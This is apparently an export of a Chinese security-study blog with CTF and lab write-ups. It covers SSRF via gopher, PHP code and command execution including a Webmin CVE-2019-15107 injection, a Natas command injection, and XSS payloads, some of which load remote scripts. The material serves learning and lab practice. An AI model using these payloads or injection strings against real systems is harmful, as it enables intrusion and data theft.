title="复现其他题目"></a>复现其他题目</h3><h4 id="web–signin"><a href="#web–signin" class="headerlink" title="web–signin"></a>web–signin</h4><p>相关知识点：ssrf</p><blockquote><p>一、先用file伪协议进行读取<code>/etc/hosts</code>文件内容</p><p><code>http://124.222.24.150:8091/?url=file:///etc/hosts</code>&#x2F;&#x2F;hosts文件包含了ip地址与主机名之间的映射,还包括主机的别名</p><p><img src="/2022/04/28/2022%E5%B9%B4%E7%AC%AC%E4%BA%8C%E5%B1%8A%E7%BD%91%E5%88%83%E6%9D%AF/7.png" alt="image-20220428211635478"></p><p>从而知道服务器的ip地址为172.73.23.21，但单访问该地址没有有用信息</p><p>二、burp抓包探测内网主机（<em>在SSRF中，dict协议与http协议可用来探测内网的主机存活与端口开放情况。</em>）</p><p><img src="/2022/04/28/2022%E5%B9%B4%E7%AC%AC%E4%BA%8C%E5%B1%8A%E7%BD%91%E5%88%83%E6%9D%AF/8.png" alt="image-20220428212925971"></p><p>发现172.73.23.100主机开着，可以进行访问</p><p>三、访问172.73.23.100</p><p><img src="/2022/04/28/2022%E5%B9%B4%E7%AC%AC%E4%BA%8C%E5%B1%8A%E7%BD%91%E5%88%83%E6%9D%AF/9.png" alt="image-20220428213308614"></p><p>传入a后提示还要post B </p><p><img src="/2022/04/28/2022%E5%B9%B4%E7%AC%AC%E4%BA%8C%E5%B1%8A%E7%BD%91%E5%88%83%E6%9D%AF/10.png" alt="image-20220428213438194"></p><p><strong>Gopher是Internet上一个非常有名的信息查找系统，它将Internet 上的文件组织成某种索引，很方便地将用户从Internet的一处带到另一处如果发起post请求，回车换行需要使用%0d%0a，如果多个参数，参数之间的&amp;也需要进行URL编码。在SSRF中经常会使用Gopher来构造GET&#x2F;POST包攻击应用。</strong></p><p>四、通过gopher协议构造url</p><p>post数据包必须包含<code>Content-Type</code>,<code>Content-Length</code>,<code>host</code>,<code>post</code>这四个参数</p><p>方法一：通过脚本生成gopher内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import urllib.parse</span><br><span class="line"></span><br><span class="line">payload = \</span><br><span class="line">&quot;&quot;&quot;POST /?a=23 HTTP/1.1</span><br><span class="line">Host: 172.73.23.100</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 5</span><br><span class="line"></span><br><span class="line">b=123</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">tmp = urllib.parse.quote(payload)</span><br><span class="line">new = tmp.replace(&#x27;%0A&#x27;,&#x27;%0D%0A&#x27;)</span><br><span class="line">result = &#x27;gopher://172.73.23.100:80/&#x27;+&#x27;_&#x27;+new</span><br><span class="line">result = urllib.parse.quote(result)</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure><p>但生成的内容还需要再进行url编码</p><p>生成内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher%3A//172.73.23.100%3A80/_POST%2520/%253Fa%253D23%2520HTTP/1.1%250D%250AHost%253A%2520172.73.23.100%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%25205%250D%250A%250D%250Ab%253D123%250D%250A</span><br></pre></td></tr></table></figure><p>方法二：bp抓包进行url两次编码</p><img src="/2022/04/28/2022%E5%B9%B4%E7%AC%AC%E4%BA%8C%E5%B1%8A%E7%BD%91%E5%88%83%E6%9D%AF/11.png" alt="image-20220428232916847" style="zoom: 67%;"><p>构造：<code>url=gopher://172.73.23.100:80/_编码的内容</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://124.222.24.150:8091/?url=gopher://172.73.23.100:80/_%50%4f%53%54%20%2f%3f%61%3d%32%33%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20%31%37%32%2e%37%33%2e%32%33%2e%31%30%30%0d%0a%43%6f%6e%74%65%6e%74%2d%54%79%70%65%3a%20%61%70%70%6c%69%63%61%74%69%6f%6e%2f%78%2d%77%77%77%2d%66%6f%72%6d%2d%75%72%6c%65%6e%63%6f%64%65%64%0d%0a%43%6f%6e%74%65%6e%74%2d%4c%65%6e%67%74%68%3a%20%35%0d%0a%0d%0a%62%3d%31%32%33</span><br></pre></td></tr></table></figure><p>五、往post的数据包中添加参数</p><img src="/2022/04/28/2022%E5%B9%B4%E7%AC%AC%E4%BA%8C%E5%B1%8A%E7%BD%91%E5%88%83%E6%9D%AF/12.png" alt="image-20220428233204569" style="zoom: 67%;"><img src="/2022/04/28/2022%E5%B9%B4%E7%AC%AC%E4%BA%8C%E5%B1%8A%E7%BD%91%E5%88%83%E6%9D%AF/13.png" alt="image-20220428233628933" style="zoom:67%;"><p>最终构造的数据包：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST /?a=23 HTTP/1.1</span><br><span class="line">Host: 172.73.23.100</span><br><span class="line">X-Forwarded-For:127.0.0.1</span><br><span class="line">Referer: bolean.club</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 5</span><br><span class="line"></span><br><span class="line">b=123</span><br></pre></td></tr></table></figure><p><img src="/2022/04/28/2022%E5%B9%B4%E7%AC%AC%E4%BA%8C%E5%B1%8A%E7%BD%91%E5%88%83%E6%9D%AF/14.png" alt="14"></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 比赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf比赛 </tag>
            
            <tag> ICS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RCE</title>
      <link href="/2022/04/17/RCE/"/>
      <url>/2022/04/17/RCE/</url>
      
        <content type="html"><![CDATA[<h2 id="RCE代码及命令执行漏洞"><a href="#RCE代码及命令执行漏洞" class="headerlink" title="RCE代码及命令执行漏洞"></a>RCE代码及命令执行漏洞</h2><p>在web应用中有时候程序员为了考虑灵活性、间接性，会在代码调用代码或命令执行函数去处理。例如当应用在调用一些能将字符串转化成代码的函数时，没有考虑用户是否能控制这个字符串，会造成代码执行漏洞。同样调用系统命令处理，将造成命令执行漏洞。</p><span id="more"></span><p><img src="/2022/04/17/RCE/1.png" alt="image-20220411154746328"></p><p>RCE漏洞原理</p><p>一般漏洞形成条件：可控变量、漏洞函数</p><h3 id="代码执行漏洞"><a href="#代码执行漏洞" class="headerlink" title="代码执行漏洞"></a>代码执行漏洞</h3><p>例如php代码里，eval()函数把字符串当作php代码执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;x&#x27;</span>];</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$code</span>); <span class="comment">// ?x=phpinfo();</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="检测："><a href="#检测：" class="headerlink" title="检测："></a>检测：</h4><p>白盒（在知道一些源码等信息前提下）：代码审计</p><p>黑盒（什么也不知道）：漏扫工具（X-scan等等）、公开漏洞、手工查看参数值及功能点</p><p>例题理解：</p><blockquote><p>墨者学院–PHP代码分析溯源(第4题)&#x2F;&#x2F;白盒：</p><p>给出了页面源码</p><p><img src="/2022/04/17/RCE/8.png" alt="image-20220414205126676"></p><p>发现需要进行base64解码,得到加密字符串内容为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> `<span class="variable">$_REQUEST</span>[a]`;; <span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//那么这段源码解码后应该为</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="keyword">echo</span> `<span class="variable">$_REQUEST</span>[a]`;; <span class="meta">?&gt;</span>);<span class="comment">//在Linux系统中，反引号`包起来的内容会被当作系统命令执行；虽然eval()函数是代码执行漏洞的漏洞函数，但a的内容应该是命令执行语句</span></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>首先获取网页目录</p><p><img src="/2022/04/17/RCE/9.png" alt="image-20220414231217535"></p><p>cat貌似被过滤了，使用tac代替一下</p><p><img src="/2022/04/17/RCE/10.png" alt="image-20220414231428787"></p></blockquote><h3 id="命令执行漏洞"><a href="#命令执行漏洞" class="headerlink" title="命令执行漏洞"></a>命令执行漏洞</h3><p>例如php代码里，system()函数执行外部程序，并且显示输出</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;x&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$code</span>); <span class="comment">//?x=ver  /?x=ipconfig  /?x=dir(windows)   /?x=ls(linux)  </span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>例题理解：</p><blockquote><p>墨者学院–命令注入执行分析</p><p>ping 127.0.0.1:说明执行命令</p><p><img src="/2022/04/17/RCE/2.png" alt="image-20220413225111188" style="zoom:50%;">e</p><p>接着通过管道服务来执行多条命令（要先确定该服务器是什么系统windows还是Linux）</p><img src="/2022/04/17/RCE/3.png" alt="image-20220413231502366" style="zoom:50%;"><p>确定是Linux系统，用ls查看目录，但出现弹窗</p><img src="/2022/04/17/RCE/4.png" alt="image-20220413232650367" style="zoom:50%;"><p>显然是前端JS验证，对传入的IP地址进行了验证</p><img src="/2022/04/17/RCE/5.png" alt="image-20220413233223824" style="zoom:50%;"><p>抓包绕过前端验证</p><img src="/2022/04/17/RCE/6.png" alt="image-20220413234305688" style="zoom:50%;"><p>通过cat命令获取key_314311794430470.php的内容，<code>cat key_314311794430470.php </code>没有回显，可能过滤了些什么，经过测验得到过滤了空格</p><p>绕过空格过滤：</p><p><code>$&#123;IFS&#125;</code>、重定向符<code>&lt;&gt;</code>、<code>%09</code>、<code>$IFS$9</code></p><p><code>cat&lt;key_314311794430470.php </code></p><p><img src="/2022/04/17/RCE/7.png" alt="image-20220413235224200"></p></blockquote><p>公开漏洞Webmin</p><blockquote><p>漏洞编号：CVE-2019-15107</p><p>漏洞描述：该漏洞允许恶意第三方在缺少输入验证的情况下而执行恶意代码；由于<code>password_change.cgi</code>文件在重置密码功能中存在一个无需权限的命令注入漏洞，通过这个漏洞，攻击者即可以执行任意系统命令。</p><p>复现：</p><p><img src="/2022/04/17/RCE/11.png" alt="11"></p><p>burp抓包进行修改相应参数（key.txt存放在根目录下）：<code>user=rootxx&amp;pam=&amp;pam=&amp;expired=2&amp;old=test|ls /&amp;new1=test2&amp;new2=test2</code></p><p><img src="/2022/04/17/RCE/12.png" alt="image-20220416141625449"></p><p>获取key.txt文件内容</p><p>将old修改成<code>old=test|cat&lt;/key.txt</code></p><p><img src="/2022/04/17/RCE/13.png" alt="image-20220416142033555"></p></blockquote><h3 id="命令执行之绕过技巧"><a href="#命令执行之绕过技巧" class="headerlink" title="命令执行之绕过技巧"></a>命令执行之绕过技巧</h3><p><a href="https://www.cnblogs.com/pursue-security/p/15291426.html">RCE篇之命令执行中的各种绕过 </a></p><h3 id="无参数RCE"><a href="#无参数RCE" class="headerlink" title="无参数RCE"></a>无参数RCE</h3><h4 id="无参数文件读取"><a href="#无参数文件读取" class="headerlink" title="无参数文件读取"></a>无参数文件读取</h4><p>通常可以使用<code>print_r(scandir(&#39;.&#39;))</code>查看当前目录下所有文件，以数组的形式输出</p><p>当正则表达式匹配过滤了带参数的传入值，上式则不能进行查询目录下的文件，那怎么查询目录下的所有文件？</p><ul><li>构造参数里的<code>.</code></li></ul><p>localeconv()函数：返回一包含本地数字及货币格式信息的数组。这个数组的第一项就是<code>.</code></p><p>current()函数：返回数组中的单元，默认是第一个值</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">localeconv</span>())));</span><br><span class="line"><span class="comment">//等同于print_r(scandir(&#x27;.&#x27;))</span></span><br></pre></td></tr></table></figure><h4 id="无参数概念理解"><a href="#无参数概念理解" class="headerlink" title="无参数概念理解"></a>无参数概念理解</h4><p>无参数RCE即通过没有参数的函数达到命令执行的目的。</p><p>代码解释：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span>===<span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li><p>如果<code>&#39;;&#39;===preg_replace(....)</code>，就会执行exp传递的命令</p></li><li><p><code>\</code>:转义字符</p></li><li><p><code>[a-z,_]+</code>:<code>[a-z,_]</code>表示匹配小写字母和下划线；<code>+</code>表示1到多个</p></li><li><p><code>(?R)?</code>:<code>(?R)</code>表示当前表达式，即单引号里面的内容；<code>?</code>表示递归当前表达式0次或1次, (?R)?能匹配类型</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a();</span><br><span class="line">a(b());</span><br><span class="line">a(b(c()));</span><br></pre></td></tr></table></figure><p> 如果是<code>(?R)*</code>表示递归当前表达式0次或多次,这个表达式可以匹配<code>a(b(c()d()))</code></p></li></ul><p>理解：</p><p>通过检查GET方式传入的exp参数的值，如果传入的值是类似<code>a()</code>，就把这个字符串换成空。通过递归替换后该字符串只会剩下<code>;</code>,符合这种情况的话，就会执行eval</p><p>例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?exp=<span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line"><span class="comment">//替换后只剩下;，最后就会执行phpinfo();</span></span><br></pre></td></tr></table></figure><h4 id="常见绕过姿势"><a href="#常见绕过姿势" class="headerlink" title="常见绕过姿势"></a>常见绕过姿势</h4><ul><li><code>getallheaders()</code></li></ul><p>​       <code>getallheaders()</code>—获取全部HTTP请求头信息，返回的是一个数组，而eval()要求的是字符串，需要搭配使用；<code>implode()</code>将一个一个一维数组的值转化成字符串</p><p>​      通过<code>getallheaders()</code>这个函数，我们可以随意添加一个头，插入恶意代码或命令，但是其局限性在于只能是apache 环境下</p><ul><li><code>get_defined_vars()</code></li></ul><p>​       <code>get_defined_vars()</code>—返回由所有已定义变量所组成的数组，返回的是一个二维数组，需要与<code>var_dump()</code>搭配使用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">get_defined_vars</span>());</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>GET方式传入的参数存在该二位数组中的第一个一维数组，可以通过这个函数将get传入的取出来</p><ul><li><code>session_id()</code></li></ul><p>​       <code>session_id()</code>—获取&#x2F;设置当前会话，可以用该函数来获取cookie中的<code>phpsessionid</code>，这个值我们是可控的；但文件会话管理器仅允许会话ID中使用以下字符：a-z A-Z 0-9和逗号和减号</p><p>解决方法：将参数转化为16进制传入，之后再用hex2bin()函数转换回来（hex2bin—转换十六进制字符串为二进制字符串）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:eval(hex2bin(session_id(session_start())));//必须要开启session才能使用</span><br></pre></td></tr></table></figure><blockquote><p>例题：禁止套娃</p><p>.git源码泄露</p><p>index.php文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line">echo &quot;flag在哪里呢？&lt;br&gt;&quot;;</span><br><span class="line">if(isset($_GET[&#x27;exp&#x27;]))&#123;</span><br><span class="line">    if (!preg_match(&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;, $_GET[&#x27;exp&#x27;])) &#123;</span><br><span class="line">        if(&#x27;;&#x27; === preg_replace(&#x27;/[a-z,_]+\((?R)?\)/&#x27;, NULL, $_GET[&#x27;exp&#x27;])) &#123;</span><br><span class="line">            if (!preg_match(&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;, $_GET[&#x27;exp&#x27;])) &#123;</span><br><span class="line">                // echo $_GET[&#x27;exp&#x27;];</span><br><span class="line">                @eval($_GET[&#x27;exp&#x27;]);</span><br><span class="line">            &#125;</span><br><span class="line">            else&#123;</span><br><span class="line">                die(&quot;还差一点哦！&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            die(&quot;再好好想想！&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        die(&quot;还想读flag，臭弟弟！&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">// highlight_file(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>读取当前目录下文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=print_r(scandir(current(localeconv())));</span><br></pre></td></tr></table></figure><p>方法一：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?exp=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">localeconv</span>()))));</span><br><span class="line">?exp=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">localeconv</span>())))));<span class="comment">//flag.php</span></span><br><span class="line">?exp=<span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">localeconv</span>())))));</span><br></pre></td></tr></table></figure><p>方法二：</p><p>session_id</p><p>抓包</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=<span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">session_id</span>(<span class="title function_ invoke__">session_start</span>()));</span><br></pre></td></tr></table></figure></blockquote>]]></content>
      
      
      <categories>
          
          <category> web基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web基础 </tag>
            
            <tag> RCE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Natas</title>
      <link href="/2022/04/09/natas/"/>
      <url>/2022/04/09/natas/</url>
      
        <content type="html"><![CDATA[<h2 id="Natas"><a href="#Natas" class="headerlink" title="Natas"></a>Natas</h2><h3 id="natas9"><a href="#natas9" class="headerlink" title="natas9"></a>natas9</h3><p>知识点：命令注入</p><span id="more"></span><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Output:</span><br><span class="line"><span class="tag">&lt;<span class="name">pre</span>&gt;</span></span><br><span class="line">&lt;?</span><br><span class="line">$key = &quot;&quot;;</span><br><span class="line"></span><br><span class="line">if(array_key_exists(&quot;needle&quot;, $_REQUEST)) &#123;</span><br><span class="line">    $key = $_REQUEST[&quot;needle&quot;];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if($key != &quot;&quot;) &#123;</span><br><span class="line">    passthru(&quot;grep -i $key dictionary.txt&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在php中调用外部命令，三种方式实现：</p><blockquote><p>（1）system()函数</p><p>​          string system(string command [, int return_var])</p><p>（2）exec()函数</p><p>​          string exec(string command [, string array [, int return _var]])</p><p>exec()函数执行给定的命令，不输出结果，而是返回结果的最后一行。虽然只返回命令结果的最后一行，但用第二个参数array可以得到完整的结果</p><p>（3）passthru()函数</p><p>​           passthru(string <code>$command</code>, int <code>&amp;$result_code</code> &#x3D; <strong><code>null</code></strong>): ?bool</p><p>passthru()函数–执行外部程序并且原始输出</p></blockquote><p>php代码调用passthru函数执行grep命令来查找key是否在dictionary.txt中，由此想到<strong>命令注入漏洞</strong></p><p>想要通过passthru函数调用命令，但先要截断grep命令（使用；或|或&amp;截取）&#x2F;&#x2F;也叫管道服务，才能执行我们要执行的命令。该平台的密码存储在&#x2F;etc&#x2F;natas_webpass目录下</p><p>构造：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">| cat /etc/natas_webpass/natas10 #</span><br></pre></td></tr></table></figure><p><img src="/2022/04/09/natas/1.png" alt="image-20220412234200988"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 靶机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web基础---XSS攻击</title>
      <link href="/2022/04/09/XSS%E6%94%BB%E5%87%BB/"/>
      <url>/2022/04/09/XSS%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<h2 id="Web基础—XSS攻击"><a href="#Web基础—XSS攻击" class="headerlink" title="Web基础—XSS攻击"></a>Web基础—XSS攻击</h2><h3 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p>XSS被称为跨站脚本攻击（Cross-site scripting），本应该缩写成CSS，但由于和CSS（Cascading Style Sheets，层叠样式脚本）重名，改名为XSS。</p><span id="more"></span><p>XSS主要基于javascript(JS)完成恶意的攻击行为，JS可以非常灵活的操作html、css和浏览器，这使得XSS攻击的“想象”空间特别大。XSS通过将精心构造的代码（JS）代码注入到网页中，并由浏览器解释运行这段JS脚本注入的网页，以达到恶意攻击的效果。用户用最简单的动作就是使用浏览器上网，并且浏览器中有javascript解释器，可以解析javascript，然而浏览器不会判断代码是否恶意，即XSS的对象是用户和浏览器。</p><p>XSS危害：</p><blockquote><p>1.窃取用户Cookie，如果用户Cookie被窃取，攻击者可以不通过密码，而直接登录用户账户<br>2.使用XMLHttpRequest构造模拟用户请求操作<br>3.XSS钓鱼攻击<br>4.用户PC信息探测收集器<br>5.XSS蠕虫攻击</p></blockquote><!--more--><h3 id="构造XSS脚本"><a href="#构造XSS脚本" class="headerlink" title="构造XSS脚本"></a>构造XSS脚本</h3><blockquote><p>1.弹窗警告</p><p>用此脚本实现弹窗提示，一般作为漏洞测试或者演示使用，类似sql注入的单引号来测试漏洞的存在，一旦此脚本能执行，意味这没有对特殊字符做过滤，因此存在XSS漏洞。</p><p>常见HTML事件属性</p><table><thead><tr><th>属性</th><th>值</th><th>描述</th></tr></thead><tbody><tr><td>onload</td><td>script</td><td>当文档加载时运行脚本</td></tr><tr><td>onerror</td><td>script</td><td>当错误发生时运行脚本</td></tr><tr><td>onclick</td><td>script</td><td>当单击鼠标时运行脚本</td></tr></tbody></table><p><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p><p><code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></p><p><code>&lt;body onload=alert(&#39;xss&#39;)&gt;</code></p><p><code>&lt;img src=# onerroe=alert(&#39;xss&#39;)&gt;</code>      **src地址错误，然后执行onerror的内容</p><p><code>&lt;a href=&#39;&#39; onclick=alert(&#39;xss&#39;)&gt;click&lt;/a&gt;</code>     ** 点击click时弹出xss</p><p>2.页面嵌套</p><p><code>&lt;iframe src=http://www.xxxxx.com width=300 height=300&gt;&lt;/iframe&gt;</code></p><p><code>&lt;iframe src=http://www.xxxxx.com width=0 height=0 border=0&gt;&lt;/iframe&gt;</code></p><p>3.页面重定向</p><p><code>&lt;script&gt;window.location=&quot;http://www.xxxxx.com&quot;&lt;/script&gt;</code></p><p><code>&lt;script&gt;location.href=&quot;http://www.xxxxx.com&quot;&lt;/script&gt;</code></p><p>4.弹窗警告并重定向</p><p><code>&lt;script&gt;alert(&#39;xxx&#39;);location.href=&quot;xxxxxx&quot;&lt;/script&gt;</code></p><p>5.访问恶意代码</p><p><code>&lt;script src=&quot;http://www.baidu.com/xss.js&quot;&gt;&lt;/script&gt;</code></p><p>6.巧用图片标签</p><p><code>&lt;img src=&quot;#&quot;alert(&#39;xss&#39;)&gt;</code></p><p><code>&lt;img src=&quot;javascript:alert(&#39;xss&#39;);&quot;&gt;</code></p><p><code>&lt;img src=&quot;http://xxxx/hook.js&quot;&gt;&lt;/img&gt;</code></p><p>7.根据上下文进行闭合+以上脚本</p></blockquote><h3 id="XSS-分类"><a href="#XSS-分类" class="headerlink" title="XSS 分类"></a>XSS 分类</h3><h4 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h4><p>反射性跨站脚本（Reflected Cross-Site Scripting）是最常见，也是使用最广的一种，可将恶意脚本附加到URL地址的参数中。</p><p>反射型XSS的利用一般是攻击者通过特定手段（如电子邮件），诱使用户去访问一个包含恶意代码的URL，当受害者点击这些专门设计的链接的时候，恶意代码会直接在受害者主机上的浏览器执行。此类XSS通常出现在网站的搜索栏、用户登录口等地方，常用来窃取客户端Cookie或进行钓鱼欺骗。</p><p>实验（DVWA－XSS（Reflected））：</p><p><strong>弹窗警告：</strong></p><p><code>&lt;script&gt;alert(1)&lt;/script&gt;  </code></p><p><img src="/2022/04/09/XSS%E6%94%BB%E5%87%BB/1.png" alt="1"></p><p><code>&lt;body onload=alert(&#39;xss&#39;)&gt;</code></p><p><img src="/2022/04/09/XSS%E6%94%BB%E5%87%BB/5.png" alt="5"></p><p><code>&lt;a href=&#39;&#39; onclick=alert(&#39;xss&#39;)&gt;click&lt;/a&gt;</code></p><p><img src="/2022/04/09/XSS%E6%94%BB%E5%87%BB/6.png" alt="6"></p><p><code>&lt;img src=&#39;http://192.168.10.128/a.jpg&#39; onerror=alert(&#39;xss&#39;)&gt;</code></p><p><img src="/2022/04/09/XSS%E6%94%BB%E5%87%BB/7.png" alt="7"></p><p><strong>重定向</strong>：</p><p><code>&lt;script&gt;window.location=&#39;http://www.baidu.com&#39;&lt;/script&gt;</code></p><p>页面跳转到百度</p><h4 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h4><p>此类XSS不需要用户点击特定URL就能执行跨站脚本，攻击者事先将恶意代码上传或储存到漏洞服务器中，只要受害者浏览包含此恶意代码的页面就会执行恶意代码的页面就会执行恶意代码。一般出现在网站留言、评论、博客日志等交互处，*<code>恶意脚本存储到客户端或者服务端的数据库中</code>*（再次访问依然会执行恶意代码）。</p><p>实验：</p><p><img src="/2022/04/09/XSS%E6%94%BB%E5%87%BB/2.png"></p><p>跳出此页面（点击任意一个项目，如XSS(DOM)这一栏）</p><p>再点击XSS(Stored)，页面如下：</p><p><img src="/2022/04/09/XSS%E6%94%BB%E5%87%BB/3.png"></p><h4 id="DOM-XSS"><a href="#DOM-XSS" 